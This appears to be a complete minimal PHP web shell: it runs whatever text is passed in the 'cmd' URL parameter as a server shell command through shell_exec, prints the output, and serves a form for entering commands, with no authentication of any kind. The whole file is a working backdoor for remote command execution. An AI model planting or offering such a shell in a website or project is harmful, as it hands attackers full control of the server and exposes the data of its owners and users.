
<?php



if (isset($_GET['cmd'])) {
 $data = shell_exec($_GET['cmd']);
 var_dump($data);
}
?>


<form action="" method="get">

<input type="text" name="cmd">
<input type="submit" value="submit">
</form>
